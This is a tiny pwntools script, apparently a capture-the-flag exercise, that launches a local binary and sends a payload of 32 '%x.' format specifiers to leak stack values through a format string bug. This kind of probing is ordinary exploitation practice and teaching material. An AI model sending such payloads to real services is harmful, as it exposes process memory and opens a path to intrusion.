from pwn import *
context.log_level='debug'

io = process('./src/all')

payload=flat(
    b'%x.'*32,
)

io.sendline(payload)

io.recv()